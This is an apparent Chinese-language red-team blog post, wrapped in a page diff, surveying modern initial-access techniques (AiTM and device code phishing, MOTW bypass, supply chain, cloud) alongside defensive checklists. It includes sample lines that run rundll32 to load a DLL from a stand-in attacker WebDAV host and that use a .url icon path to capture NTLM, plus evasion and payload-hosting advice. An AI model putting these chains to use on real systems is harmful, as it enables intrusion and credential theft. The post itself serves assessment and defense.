@@ -1,0 +1,491 @@
+<!DOCTYPE html><html lang="zh-CN" data-astro-cid-sgg5joot><head><!-- Global Metadata --><meta charset="utf-8"><meta name="viewport" content="width=device-width,initial-scale=1"><link rel="icon" type="image/png" href="/favicon.png"><link rel="icon" href="/favicon.ico" sizes="any"><link rel="apple-touch-icon" href="/apple-touch-icon.png"><link rel="sitemap" href="/sitemap-index.xml"><link rel="alternate" type="application/rss+xml" title="Zumpyx's Blog" href="https://blog.zumpyx.com/rss.xml"><meta name="generator" content="Astro v7.1.0"><meta name="color-scheme" content="light dark"><meta name="theme-color" content="#0b0d11" media="(prefers-color-scheme: dark)"><meta name="theme-color" content="#f4f5f7" media="(prefers-color-scheme: light)"><script>
+	(() => {
+		try {
+			const t = localStorage.getItem('theme');
+			if (t === 'light' || t === 'dark') document.documentElement.setAttribute('data-theme', t);
+			else document.documentElement.removeAttribute('data-theme');
+		} catch {}
+	})();
+</script><style>@font-face{font-family:Atkinson-c7f4c4e8b285552f;src:url("/_astro/fonts/89758defcfa85239.woff") format("woff");font-display:swap;font-weight:400;font-style:normal;}@font-face{font-family:Atkinson-c7f4c4e8b285552f;src:url("/_astro/fonts/14aa8dd5744dd4bc.woff") format("woff");font-display:swap;font-weight:700;font-style:normal;}@font-face{font-family:"Atkinson-c7f4c4e8b285552f fallback: Arial";src:local("Arial");font-display:swap;font-weight:400;font-style:normal;size-adjust:99.3717%;ascent-override:80.1033%;descent-override:25.2587%;line-gap-override:0%;}@font-face{font-family:"Atkinson-c7f4c4e8b285552f fallback: Arial Bold";src:local("Arial Bold");font-display:swap;font-weight:700;font-style:normal;size-adjust:92.2954%;ascent-override:86.2448%;descent-override:27.1953%;line-gap-override:0%;}:root{--font-atkinson:Atkinson-c7f4c4e8b285552f,"Atkinson-c7f4c4e8b285552f fallback: Arial","Atkinson-c7f4c4e8b285552f fallback: Arial Bold",sans-serif;}</style><link rel="preload" href="/_astro/fonts/89758defcfa85239.woff" as="font" type="font/woff" crossorigin><link rel="preload" href="/_astro/fonts/14aa8dd5744dd4bc.woff" as="font" type="font/woff" crossorigin><!-- Canonical URL --><link rel="canonical" href="https://blog.zumpyx.com/blog/modern-initial-access/"><!-- Primary Meta Tags --><title>浅谈初始访问 · Zumpyx&#39;s Blog</title><meta name="description" content="面向 2025–2026 对抗环境，浅谈初始访问：身份与 AiTM、MOTW 绕过、开发者供应链、云与 Entra ID、RMM/社工与防御要点。"><!-- Open Graph / Facebook --><meta property="og:type" content="website"><meta property="og:url" content="https://blog.zumpyx.com/blog/modern-initial-access/"><meta property="og:title" content="浅谈初始访问 · Zumpyx's Blog"><meta property="og:description" content="面向 2025–2026 对抗环境，浅谈初始访问：身份与 AiTM、MOTW 绕过、开发者供应链、云与 Entra ID、RMM/社工与防御要点。"><meta property="og:image" content="https://blog.zumpyx.com/_astro/head.CE6FOIKY.png"><!-- Twitter --><meta name="twitter:card" content="summary_large_image"><meta name="twitter:url" content="https://blog.zumpyx.com/blog/modern-initial-access/"><meta name="twitter:title" content="浅谈初始访问 · Zumpyx's Blog"><meta name="twitter:description" content="面向 2025–2026 对抗环境，浅谈初始访问：身份与 AiTM、MOTW 绕过、开发者供应链、云与 Entra ID、RMM/社工与防御要点。"><meta name="twitter:image" content="https://blog.zumpyx.com/_astro/head.CE6FOIKY.png"><link rel="stylesheet" href="/_astro/Header.CMmW25g2.css"><link rel="stylesheet" href="/_astro/ArticleLayout.DA3idRZl.css"><style>.nav-link[data-astro-cid-evkijfd6]{color:var(--text-muted);font-family:var(--font-mono);letter-spacing:.04em;text-transform:uppercase;white-space:nowrap;border:1px solid #0000;border-radius:999px;justify-content:center;align-items:center;padding:.5em .95em;font-size:.78rem;font-weight:500;text-decoration:none;transition:color .18s,background .18s,border-color .18s,box-shadow .18s;display:inline-flex}.nav-link[data-astro-cid-evkijfd6]:hover{color:var(--text-bright);background:var(--surface-hover);text-decoration:none}.nav-link[data-astro-cid-evkijfd6].active{color:var(--on-accent);background:linear-gradient(135deg, var(--accent-hover), var(--accent));box-shadow:0 0 0 1px var(--border-strong), 0 6px 16px var(--accent-glow-strong);text-shadow:none;border-color:#0000;font-weight:700;text-decoration:none}
+</style><script type="module" src="/_astro/page.CTxKKjGj.js"></script></head><body data-astro-cid-sgg5joot><div class="scanline" aria-hidden="true" data-astro-cid-sgg5joot></div><header data-astro-cid-nen7h5rs><div class="bar" data-astro-cid-nen7h5rs><a class="brand" href="/" data-astro-cid-nen7h5rs><span class="logo" aria-hidden="true" data-astro-cid-nen7h5rs><img src="/_astro/head.CE6FOIKY_1SW1hc.webp" srcset="/_astro/head.CE6FOIKY_1SW1hc.webp 1x, /_astro/head.CE6FOIKY_scYzG.webp 2x" alt data-astro-cid-nen7h5rs="true" loading="lazy" decoding="async" width="64" height="64" class="logo-img"></span><span class="brand-text" data-astro-cid-nen7h5rs><span class="brand-name" data-astro-cid-nen7h5rs>Zumpyx&#39;s Blog</span></span></a><nav class="nav-pill" aria-label="Primary" data-astro-cid-nen7h5rs><div class="nav-track" data-astro-cid-nen7h5rs><a href="/" class="nav-link" data-astro-cid-nen7h5rs="true" data-astro-cid-evkijfd6>Home</a><a href="/blog" class="nav-link active" data-astro-cid-nen7h5rs="true" data-astro-cid-evkijfd6>Blog</a><a href="/hackthebox" class="nav-link" data-astro-cid-nen7h5rs="true" data-astro-cid-evkijfd6>HackTheBox</a><a href="/projects" class="nav-link" data-astro-cid-nen7h5rs="true" data-astro-cid-evkijfd6>Projects</a><a href="/about" class="nav-link" data-astro-cid-nen7h5rs="true" data-astro-cid-evkijfd6>About</a></div></nav><div class="actions" data-astro-cid-nen7h5rs><button type="button" class="icon-btn search-trigger" data-search-open aria-label="搜索" title="搜索 (Ctrl/⌘+K)" data-astro-cid-7yy3665x><svg viewBox="0 0 24 24" width="18" height="18" fill="none" stroke="currentColor" stroke-width="1.8" aria-hidden="true" data-astro-cid-7yy3665x><circle cx="11" cy="11" r="6.5" data-astro-cid-7yy3665x></circle><path d="M16.5 16.5 21 21" stroke-linecap="round" data-astro-cid-7yy3665x></path></svg></button><div class="search-root" data-search-root hidden data-astro-cid-7yy3665x><div class="search-backdrop" data-search-close data-astro-cid-7yy3665x></div><div class="search-panel" role="dialog" aria-modal="true" aria-label="全站搜索" data-astro-cid-7yy3665x><div class="search-bar" data-astro-cid-7yy3665x><svg class="search-ico" viewBox="0 0 24 24" width="18" height="18" fill="none" stroke="currentColor" stroke-width="1.8" aria-hidden="true" data-astro-cid-7yy3665x><circle cx="11" cy="11" r="6.5" data-astro-cid-7yy3665x></circle><path d="M16.5 16.5 21 21" stroke-linecap="round" data-astro-cid-7yy3665x></path></svg><input type="search" class="search-input" data-search-input placeholder="全文搜索：标题 / 正文 / 标签…" autocomplete="off" autocapitalize="off" spellcheck="false" enterkeyhint="search" data-astro-cid-7yy3665x><kbd class="search-kbd" data-search-close-hint data-astro-cid-7yy3665x>Esc</kbd></div><div class="search-meta" data-search-meta data-astro-cid-7yy3665x>输入关键词开始搜索</div><ul class="search-results" data-search-results role="listbox" aria-label="搜索结果" data-astro-cid-7yy3665x></ul></div></div><script type="module" src="/_astro/SiteSearch.astro_astro_type_script_index_0_lang.CiT4pk6n.js"></script><button type="button" class="icon-btn theme-toggle" data-theme-toggle aria-label="主题：跟随系统" title="主题：跟随系统（点击切换）" data-astro-cid-l6lhmie6><span class="icon icon-system" aria-hidden="true" data-astro-cid-l6lhmie6><!-- auto / system --><svg viewBox="0 0 24 24" width="18" height="18" fill="none" stroke="currentColor" stroke-width="1.8" data-astro-cid-l6lhmie6><rect x="3" y="4" width="18" height="12" rx="2" data-astro-cid-l6lhmie6></rect><path d="M8 20h8M12 16v4" data-astro-cid-l6lhmie6></path></svg></span><span class="icon icon-light" aria-hidden="true" hidden data-astro-cid-l6lhmie6><svg viewBox="0 0 24 24" width="18" height="18" fill="none" stroke="currentColor" stroke-width="1.8" data-astro-cid-l6lhmie6><circle cx="12" cy="12" r="4" data-astro-cid-l6lhmie6></circle><path d="M12 2v2M12 20v2M4.93 4.93l1.41 1.41M17.66 17.66l1.41 1.41M2 12h2M20 12h2M4.93 19.07l1.41-1.41M17.66 6.34l1.41-1.41" data-astro-cid-l6lhmie6></path></svg></span><span class="icon icon-dark" aria-hidden="true" hidden data-astro-cid-l6lhmie6><svg viewBox="0 0 24 24" width="18" height="18" fill="none" stroke="currentColor" stroke-width="1.8" data-astro-cid-l6lhmie6><path d="M21 14.5A8.5 8.5 0 1 1 9.5 3a7 7 0 0 0 11.5 11.5z" stroke-linejoin="round" data-astro-cid-l6lhmie6></path></svg></span></button><script>
+	(() => {
+		const KEY = 'theme';
+		const ORDER = ['system', 'light', 'dark'];
+		const LABELS = {
+			system: '主题：跟随系统',
+			light: '主题：亮色',
+			dark: '主题：暗色',
+		};
+
+		const getStored = () => {
+			try {
+				const v = localStorage.getItem(KEY);
+				if (v === 'light' || v === 'dark' || v === 'system') return v;
+			} catch {}
+			return 'system';
+		};
+
+		const apply = (mode) => {
+			const root = document.documentElement;
+			if (mode === 'light' || mode === 'dark') root.setAttribute('data-theme', mode);
+			else root.removeAttribute('data-theme');
+			try {
+				if (mode === 'system') localStorage.removeItem(KEY);
+				else localStorage.setItem(KEY, mode);
+			} catch {}
+		};
+
+		const syncButton = (mode) => {
+			document.querySelectorAll('[data-theme-toggle]').forEach((btn) => {
+				btn.setAttribute('data-mode', mode);
+				btn.setAttribute('aria-label', LABELS[mode]);
+				btn.setAttribute('title', `${LABELS[mode]}（点击切换）`);
+				btn.querySelectorAll('.icon').forEach((el) => {
+					el.hidden = true;
+				});
+				const icon = btn.querySelector(`.icon-${mode}`);
+				if (icon) icon.hidden = false;
+			});
+		};
+
+		const mode = getStored();
+		apply(mode);
+		syncButton(mode);
+
+		document.querySelectorAll('[data-theme-toggle]').forEach((btn) => {
+			btn.addEventListener('click', () => {
+				const cur = getStored();
+				const next = ORDER[(ORDER.indexOf(cur) + 1) % ORDER.length];
+				apply(next);
+				syncButton(next);
+			});
+		});
+
+		// If following system, react to OS changes
+		try {
+			const mq = window.matchMedia('(prefers-color-scheme: dark)');
+			mq.addEventListener?.('change', () => {
+				if (getStored() === 'system') apply('system');
+			});
+		} catch {}
+	})();
+</script><a class="icon-btn" href="/rss.xml" target="_blank" rel="noopener noreferrer" title="RSS" aria-label="RSS 订阅" data-astro-cid-nen7h5rs><svg viewBox="0 0 24 24" width="18" height="18" fill="none" stroke="currentColor" stroke-width="1.8" aria-hidden="true" data-astro-cid-nen7h5rs><path d="M5 19a1.5 1.5 0 1 0 0.01 0" fill="currentColor" stroke="none" data-astro-cid-nen7h5rs></path><path d="M4 11a9 9 0 0 1 9 9" stroke-linecap="round" data-astro-cid-nen7h5rs></path><path d="M4 5a15 15 0 0 1 15 15" stroke-linecap="round" data-astro-cid-nen7h5rs></path></svg></a></div></div></header><main data-astro-cid-sgg5joot><article data-astro-cid-sgg5joot><div class="article-shell" data-astro-cid-sgg5joot><div class="prose" data-article-body data-astro-cid-sgg5joot><div class="title" data-astro-cid-sgg5joot><div class="date" data-astro-cid-sgg5joot><time datetime="2026-07-20T00:00:00.000Z">2026-07-20</time></div><div class="title-row" data-astro-cid-sgg5joot><h1 data-astro-cid-sgg5joot>浅谈初始访问</h1></div><div class="meta" data-astro-cid-sgg5joot><span class="badge">initial-access</span><span class="badge">phishing</span><span class="badge">identity</span><span class="badge">red-team</span><span class="badge">cloud</span><span class="badge">MOTW</span></div><hr data-astro-cid-sgg5joot></div><div class="content" data-article-content data-astro-cid-sgg5joot><blockquote>
+<p><strong>说明</strong>：本文由旧版 <code>initial-access</code> 英文笔记翻译、重组，并按 2025–2026 公开威胁趋势做了增补。只作<strong>浅谈</strong>——侧重思路与对抗面，不是逐步 exploit 教程；红队仅限授权评估，蓝队可用于加固优先级。</p>
+</blockquote>
+<h2 id="写在前面初始访问变了什么">写在前面：初始访问变了什么</h2>
+<p>过去十年常见路径是「邮件附件宏 → 落地执行」。当前主流环境里：</p>
+<ol>
+<li><strong>MOTW + 默认拦宏</strong> 让传统 Office 宏首发极不可靠。</li>
+<li><strong>身份层（OAuth / 会话 / Device Code）</strong> 往往比落地二进制更划算。</li>
+<li><strong>AiTM 与 Device Code 钓鱼</strong> 已从 APT 手法变成 PhaaS 标配；2026 年 Device Code 相关检测量级公开报道呈数量级上升。</li>
+<li><strong>边缘设备 0day / Nday</strong>（VPN、文件网关、协作套件）可在「没有凭据」时直接进网。</li>
+<li><strong>合法远程运维软件（RMM）</strong> 与 <strong>帮助台社工</strong> 组合，绕过应用白名单与部分 EDR。</li>
+</ol>
+<p>评估与防御都应按 <strong>「身份 → 边界 → 终端 → 供应链」</strong> 分层建模，而不是只盯邮件附件。</p>
+<hr>
+<h2 id="1-初始访问向量总览">1. 初始访问向量总览</h2>
+<h3 id="11-邮件与社工">1.1 邮件与社工</h3>
+<table>
+<thead>
+<tr>
+<th>方向</th>
+<th>要点（2025–2026）</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>附件</td>
+<td>直接可执行体基本死；相对更常见的是 <code>PDF/HTML/SVG/ISO/IMG</code>、OneNote、容器内 LNK</td>
+</tr>
+<tr>
+<td>链接</td>
+<td>域名年龄/分类/信誉、HTTPS、短路径；先「养域」再带载荷</td>
+</tr>
+<tr>
+<td>HTML Smuggling</td>
+<td>浏览器侧生成 Blob 下载，绕过部分网关对「响应体即载荷」的检测</td>
+</tr>
+<tr>
+<td>日历/二维码</td>
+<td><code>.ics</code> 邀请、发票/简历 PDF 中的 <strong>Quishing</strong>，把受害者赶到<strong>手机浏览器</strong>完成 OAuth</td>
+</tr>
+<tr>
+<td>宏现状</td>
+<td>带 MOTW 的 Internet 源文档默认拦宏；需信任位置、容器剥离 MOTW、或彻底换向量</td>
+</tr>
+<tr>
+<td>发送卫生</td>
+<td>避免 <code>no-reply</code>；控制图文比与链接数；用真实中继链路；发出前做 spam 头/评分自检</td>
+</tr>
+</tbody>
+</table>
+<p><strong>仍值得记住的附件边缘格式</strong>（出厂策略覆盖不均时）：<code>PPTM/PPSM/ACCDE</code>、SVG 内嵌脚本、Office 远程模板注入（抓 NTLM，可不依赖宏）。</p>
+<h3 id="12-身份与-mfa-绕过当前权重最高">1.2 身份与 MFA 绕过（当前权重最高）</h3>
+<ul>
+<li><strong>AiTM 反向代理钓鱼</strong>（Evilginx / EvilProxy / Tycoon 等）：用户在「看起来真」的链路上完成 MFA，攻击者截获<strong>会话 Cookie / 令牌</strong>，不是「只偷密码」。</li>
+<li><strong>Device Code 钓鱼</strong>：滥用 OAuth 设备授权流；受害者在 <strong>真实的</strong> <code>microsoft.com/devicelogin</code> 输入攻击者生成的 code，批准后攻击者拿到 refresh token。<strong>不经过仿站密码框</strong>，对「只认登录页域名」的用户教育与部分网关策略都更难挡。</li>
+<li><strong>Consent / OAuth 应用授权钓鱼</strong>：诱导用户给恶意云应用过度 scope，形成<strong>基于令牌的持久访问</strong>。</li>
+<li><strong>MFA 疲劳 / 轰炸</strong>：推送轰炸 + 电话社工「帮你点一下」。</li>
+<li><strong>Browser-in-Browser (BitB)</strong>：像素级假 OAuth 窗，纯凭据窃取、可不落盘。</li>
+<li><strong>Passkey / WebAuthn</strong>：Evilginx 3.x 等已能代理部分流程；真正抗钓鱼仍依赖 <strong>origin 绑定的硬件密钥 / 平台认证器</strong>，不能假设「上了 passkey 就绝对安全」。</li>
+<li><strong>BEC</strong>：财务/供应商场景；深伪语音 CEO 欺诈在 2025–2026 仍是高频报道主题。</li>
+</ul>
+<p><strong>红队评估</strong>：优先测 Conditional Access 缺口（旧协议、受信任位置、未覆盖应用）、Device Code 是否被策略限制、管理员同意工作流是否强制。</p>
+<p><strong>蓝队优先</strong>：禁用/严格限制 Device Code；应用同意仅限已验证发布者 + 管理员审批；会话/令牌异常检测；钓鱼抗 MFA（FIDO2）；封禁基础认证/遗留协议。</p>
+<h3 id="13-边界与凭据复用">1.3 边界与凭据复用</h3>
+<ul>
+<li>密码喷射：O365 自定义登录页、VPN、SSO 门户</li>
+<li>单因素 VPN / 网关 / 暴露 RDP</li>
+<li>未修补边缘设备与默认口令（历史上 Ivanti、Citrix Bleed、MOVEit 等已证明「凭据之前就能 RCE」）</li>
+<li>外泄凭据撞库</li>
+</ul>
+<p>维护一张 <strong>「野外在用的边界 CVE」</strong> 表，升级滞后时用 WAF/虚拟补丁兜底。</p>
+<h3 id="14-近源与无线">1.4 近源与无线</h3>
+<ul>
+<li>Evil Twin → 企业 WPA2-Enterprise → NetNTLMv2 → 内网认证后 Responder</li>
+<li>有线接入：Responder / mitm6 / ldaprelayx</li>
+<li>HID 模拟 U 盘（少见但评估范围可保留）</li>
+</ul>
+<h3 id="15-seo--恶意广告">1.5 SEO / 恶意广告</h3>
+<ul>
+<li>搜索广告投毒（假 PuTTY、WinSCP 等）在 2024–2025 仍是装载器主要投递面之一</li>
+<li>结合「软件下载」心智，绕过邮件链路</li>
+</ul>
+<h3 id="16-供应链与开发者">1.6 供应链与开发者</h3>
+<ul>
+<li>npm / PyPI / Cargo 拼写劫持与 <code>postinstall</code></li>
+<li>被投毒的 GitHub Actions、CI 密钥外带</li>
+<li>容器镜像投毒、<code>curl | bash</code> 安装脚本</li>
+<li>Git 配置投毒（<code>core.fsmonitor</code> / hooks）、VS Code / JetBrains 插件供应链</li>
+<li>开发者工作站常是<strong>第一落点</strong>（云密钥、K8s 配置、源码）</li>
+</ul>
+<h3 id="17-云与-k8s-配置错误">1.7 云与 K8s 配置错误</h3>
+<ul>
+<li>可写后执行的对象存储</li>
+<li>SSRF → IMDS（仍多见 v1）窃取实例角色</li>
+<li>暴露的 K8s API / Argo CD、Azure SAS 泄露</li>
+<li>OIDC 工作负载身份、STS 联邦令牌、Cognito 未认证身份池</li>
+<li>Lambda 环境变量与 Function URL 鉴权问题</li>
+</ul>
+<h3 id="18-entra-id--协作套件--移动">1.8 Entra ID / 协作套件 / 移动</h3>
+<ul>
+<li><strong>PRT</strong> 窃取与持久 SSO</li>
+<li>Conditional Access 缺口、跨租户 B2B 访客</li>
+<li>Teams / Slack / Discord 恶意应用与过度 OAuth；Teams 外部消息默认可达时绕过邮件网关</li>
+<li>SharePoint Framework 侧载</li>
+<li>短信钓鱼、WhatsApp/Telegram、恶意 MDM 描述文件、TestFlight 类侧载</li>
+</ul>
+<h3 id="19-合法软件借壳">1.9 合法软件「借壳」</h3>
+<p><strong>RMM / 远程协助滥用</strong>（AnyDesk、TeamViewer、ConnectWise、Quick Assist 等）：</p>
+<ul>
+<li>社工安装「官方签名」远程工具</li>
+<li>绕过应用白名单与部分「只拦未知样本」的 EDR 策略</li>
+<li>常与垃圾邮件轰炸 + 电话社工组合制造紧迫感</li>
+</ul>
+<h3 id="110-ai-相关入口">1.10 AI 相关入口</h3>
+<ul>
+<li>深伪语音/视频假冒高管或 IT</li>
+<li>企业 Copilot / RAG：<strong>文档投毒 → 提示注入</strong></li>
+<li>投毒微调权重或浏览器侧恶意扩展污染 AI 工作流</li>
+</ul>
+<h3 id="111-仍有效的旧技术债">1.11 仍有效的「旧」技术债</h3>
+<p><strong>WinRM over HTTPS（5986）与 Channel Binding</strong>：若 <code>CbtHardeningLevel</code> 非 <strong>Strict</strong>，可能在「以为加固了」的情况下引入 NTLM 中继面。HTTP WinRM（5985）因 SPNEGO/通道绑定默认行为，中继条件不同——加固时不要想当然。</p>
+<pre class="astro-code astro-code-themes github-light houston" style="--shiki-light:#24292e;--shiki-dark:#eef0f9;--shiki-light-bg:#fff;--shiki-dark-bg:#17191e; overflow-x: auto;" tabindex="0" data-language="powershell"><code><span class="line"><span style="--shiki-light:#24292E;--shiki-dark:#EEF0F9">winrm set winrm</span><span style="--shiki-light:#D73A49;--shiki-dark:#EEF0F9">/</span><span style="--shiki-light:#24292E;--shiki-dark:#EEF0F9">config</span><span style="--shiki-light:#D73A49;--shiki-dark:#EEF0F9">/</span><span style="--shiki-light:#24292E;--shiki-dark:#EEF0F9">service</span><span style="--shiki-light:#D73A49;--shiki-dark:#EEF0F9">/</span><span style="--shiki-light:#24292E;--shiki-dark:#EEF0F9">auth </span><span style="--shiki-light:#032F62;--shiki-dark:#FFD493">'@{CbtHardeningLevel="Strict"}'</span></span></code></pre>
+<p>优先 Kerberos / 证书认证；收缩 NTLM。</p>
+<p><strong>Power Platform</strong>：过宽共享连接、经本地数据网关的 Power Query 原生 SQL 等，评估时不要漏。</p>
+<hr>
+<h2 id="2-现代防御栈攻击者要绕什么">2. 现代防御栈（攻击者要绕什么）</h2>
+<table>
+<thead>
+<tr>
+<th>层</th>
+<th>典型产品/能力</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>邮件安全</td>
+<td>Defender for Office 365、各类 SEG</td>
+</tr>
+<tr>
+<td>Web 网关</td>
+<td>Zscaler、BlueCoat、下一代防火墙代理等</td>
+</tr>
+<tr>
+<td>安全 DNS</td>
+<td>Umbrella、同类企业 DNS 过滤</td>
+</tr>
+<tr>
+<td>AV / EDR</td>
+<td>MDE、CrowdStrike、SentinelOne、Carbon Black 等</td>
+</tr>
+</tbody>
+</table>
+<h3 id="防御速赢蓝队清单">防御速赢（蓝队清单）</h3>
+<p><strong>邮件 / Web</strong></p>
+<ul>
+<li>Safe Links / Safe Attachments（或等价）</li>
+<li>禁止直下可执行类；未知文件沙箱</li>
+</ul>
+<p><strong>Office</strong></p>
+<ul>
+<li>强制「阻止 Internet 宏（MOTW）」</li>
+<li>禁 XLL、未签名 COM 加载项、Excel 4.0 宏</li>
+<li>ASR：拦 Office 子进程、Office 调 Win32 API、邮件/网页来源可执行内容、LSASS 凭据窃取等</li>
+</ul>
+<p><strong>浏览器</strong></p>
+<ul>
+<li>扩展白名单；托管设备关开发者模式</li>
+</ul>
+<p><strong>身份</strong></p>
+<ul>
+<li>强制 MFA，且尽量 <strong>抗钓鱼（FIDO2）</strong></li>
+<li>OAuth 同意治理；禁遗留认证</li>
+<li>监控 Device Code、异常刷新令牌、不可能旅行/新设备</li>
+</ul>
+<p><strong>终端</strong></p>
+<ul>
+<li>WDAC / Smart App Control / 应用允许列表</li>
+<li>PowerShell CLM 例外审计 + Script Block 日志</li>
+<li>WinRM：Kerberos/证书 + CBT Strict</li>
+</ul>
+<hr>
+<h2 id="3-安全控件绕过思路概要">3. 安全控件绕过思路（概要）</h2>
+<h3 id="31-边界">3.1 边界</h3>
+<p><strong>Web 网关</strong>敏感：域名特征、抓取内容、MIME。绕过思路：高信誉云资源、HTML Smuggling、CDN/对象存储托管。</p>
+<p><strong>安全 DNS</strong>敏感：分类、注册时长、威胁情报、证书。绕过思路：高信誉云域、合法 CDN；投放前用信誉查询自检（如 Talos Reputation）。</p>
+<h3 id="32-终端-av--edr原则级">3.2 终端 AV / EDR（原则级）</h3>
+<p>AV 链路大致：静态 → 启发式 → 云信誉/沙箱 → ML → 模拟 → 行为。</p>
+<p>绕过原则（评估用语）：</p>
+<ul>
+<li>静态：定制、少复用公开样本</li>
+<li>信誉：信任签名体 + 侧载、容器投递</li>
+<li>沙箱：环境键控、延迟、合理用户行为</li>
+<li>行为：少扎堆敏感 API、低慢节奏；unhook/直接系统调用在部分环境仍有讨论价值</li>
+</ul>
+<p>EDR 更深主题（虚拟化执行、Early Cascade、Sleep 混淆、调用栈伪造等）应单独立篇；本文只保留与<strong>初始访问投递链</strong>相关的部分。</p>
+<hr>
+<h2 id="4-载荷托管">4. 载荷托管</h2>
+<p>好的托管点应：<strong>看起来像正常文件站、受信 TLS、难被目标一刀切封锁</strong>。</p>
+<ul>
+<li>对象存储 / 网盘：OneDrive、SharePoint、S3、Azure Blob、GCS、Firebase</li>
+<li>CDN / Serverless：Azure CDN、CloudFront、Cloudflare Workers、Lambda 等</li>
+<li>参考 <a href="https://lots-project.com/">LOTS Project</a>（Living Off Trusted Sites）</li>
+<li>执行侧配合 <a href="https://lolbas-project.github.io/">LOLBAS</a>：优先 DLL、间接执行、侧载 / COM / XLL</li>
+<li>关注微软应用控制相关「可绕过 WDAC 的应用」清单，避免评估与真实策略脱节</li>
+</ul>
+<hr>
+<h2 id="5-感染向量与投递链">5. 感染向量与投递链</h2>
+<h3 id="51-经典与平台差异">5.1 经典与平台差异</h3>
+<ul>
+<li><strong>macOS</strong>：未签名应用仍可能「多点几下」通过；Office 宏 + 门禁约束更大；工具向可参考 Mystikal 等（仅授权环境）。</li>
+<li>载体优先考虑：<code>LNK, CHM, CPL, DLL, MSI, HTML, SVG</code>；宏 Office / 裸 ISO 作为「唯一一跳」越来越难。</li>
+</ul>
+<h3 id="52-抗-motw--弱-motw-路径">5.2 抗 MOTW / 弱 MOTW 路径</h3>
+<h4 id="webdav--lnk">WebDAV + LNK</h4>
+<p>经 WebDAV UNC 访问的文件在部分配置下 <strong>MOTW 标记弱或缺失</strong>。</p>
+<p>典型链：</p>
+<ol>
+<li>HTTPS WebDAV 托管 DLL</li>
+<li>邮件 / HTML Smuggling 投递 LNK</li>
+<li>LNK → <code>rundll32 \\host@SSL\DavWWWRoot\evil.dll,Export</code></li>
+</ol>
+<pre class="astro-code astro-code-themes github-light houston" style="--shiki-light:#24292e;--shiki-dark:#eef0f9;--shiki-light-bg:#fff;--shiki-dark-bg:#17191e; overflow-x: auto;" tabindex="0" data-language="text"><code><span class="line"><span>Target: C:\Windows\System32\rundll32.exe</span></span>
+<span class="line"><span>Args:   \\attacker.example@SSL\DavWWWRoot\evil.dll,DllMain</span></span></code></pre>
+<h4 id="search-ms-协议处理程序"><code>search-ms:</code> 协议处理程序</h4>
+<p>打开「像本地搜索结果」的远程位置；2024 年起相关滥用与 CVE-2024-21412 变种被广泛讨论。钓鱼页可直接链到 <code>search-ms:</code>。</p>
+<h4 id="library-ms"><code>.library-ms</code></h4>
+<p>XML 虚拟库指向 WebDAV/SMB，双击进资源管理器，审查面常弱于 ISO/ZIP。</p>
+<h4 id="url-图标-ntlm"><code>.url</code> 图标 NTLM</h4>
+<p><code>IconFile=\\attacker\share\icon.ico</code> —— <strong>预览即可</strong>触发认证，适合 Responder 捕获后破解或中继。</p>
+<h4 id="office-远程模板注入">Office 远程模板注入</h4>
+<p><code>document.xml.rels</code> 外置模板 → 打开即请求远程 → <strong>无宏也可抓 NTLM</strong>；模板里再挂二阶段。</p>
+<h3 id="53-容器与-motw">5.3 容器与 MOTW</h3>
+<p>Internet 下载文件带 MOTW；Office 默认可挡宏。部分容器解压时 <strong>不向内部文件传递 MOTW</strong>（ISO/IMG、部分 7z/CAB/VHD/WIM 等——以实测与 <a href="https://github.com/nmantani/archiver-MOTW-support-comparison">archiver-MOTW 对比</a> 为准）。</p>
+<blockquote>
+<p>Windows 11 22H2+：资源管理器双击挂载的 ISO 可能继承 MOTW；<code>Mount-DiskImage</code> 等路径行为需按版本验证。</p>
+</blockquote>
+<h3 id="54-成功链的配方">5.4 成功链的「配方」</h3>
+<p>野外常见结构可抽象为：</p>
+<pre class="astro-code astro-code-themes github-light houston" style="--shiki-light:#24292e;--shiki-dark:#eef0f9;--shiki-light-bg:#fff;--shiki-dark-bg:#17191e; overflow-x: auto;" tabindex="0" data-language="text"><code><span class="line"><span>投递(钓鱼链接/PDF) → HTML Smuggling → 容器(ISO/ZIP)</span></span>
+<span class="line"><span>  → 触发器(LNK/CHM) → 载荷(侧载DLL / LOLBIN / MSI…) + 诱饵文档</span></span></code></pre>
+<p>示例思路（示意，非通用免杀）：</p>
+<ul>
+<li>侧载：合法签名 EXE + 恶意 DLL</li>
+<li><code>rundll32</code> / 其他 LOLBIN 加载</li>
+<li>MSI 静默安装、<code>TRANSFORMS</code> 打补丁包</li>
+<li>ClickOnce 多文件打包进容器后再部署</li>
+<li>持久化：<code>XLSTART</code> 的 <code>.xlam</code>、Outlook <code>VbaProject.OTM</code>（路径与注册表需按版本校正）</li>
+</ul>
+<p><strong>宏策略提醒</strong>：<code>AutoOpen</code> 类首发在默认策略下成功率低；更现实的是「信任位置 / 加载项 / 后续 COM 劫持」或根本不走宏。</p>
+<h3 id="55-vba-仍可能出现的位置降级策略">5.5 VBA 仍可能出现的位置（降级策略）</h3>
+<ul>
+<li>执行：<code>WScript.Shell</code>、<code>Shell.Application</code>、过时但偶发可用的 <code>RDS.DataSpace</code></li>
+<li>规避 ASR 时出现过的 <code>new:CLSID</code> 写法属于<strong>历史技巧</strong>，现网 ASR/AMSI 已大量覆盖，评估价值大于实战依赖</li>
+<li>避免在 VBA 里直接打显眼 WinAPI（<code>CreateProcess</code> 等）</li>
+<li>DotNetToJScript、落地 dropper：前提仍是「宏/脚本能跑」——这是最大瓶颈</li>
+</ul>
+<hr>
+<h2 id="6-msi--安装包与可执行体压缩要点">6. MSI / 安装包与可执行体（压缩要点）</h2>
+<p><strong>MSI</strong></p>
+<ul>
+<li>静默安装、自定义 Action、改造合法 MSI、MST 变换</li>
+<li>与 MOTW、SmartScreen、WDAC 的交互要单独测</li>
+</ul>
+<p><strong>现代应用包</strong></p>
+<ul>
+<li>MSIX / AppX 侧载策略因租户而异</li>
+</ul>
+<p><strong>PE / Shellcode</strong></p>
+<ul>
+<li>Donut、sRDI、pe2shc、Amber 等「EXE/DLL → shellcode」</li>
+<li>加载器与合法 PE 后门化、ScareCrow / Nim 打包等属于<strong>执行阶段</strong>，建议与本文拆分维护</li>
+</ul>
+<hr>
+<h2 id="7-新兴与高价值专项">7. 新兴与高价值专项</h2>
+<h3 id="71-开发者定向">7.1 开发者定向</h3>
+<table>
+<thead>
+<tr>
+<th>向量</th>
+<th>机制</th>
+<th>备注</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>Git 配置投毒</td>
+<td><code>core.fsmonitor</code> / <code>hooksPath</code> / filter</td>
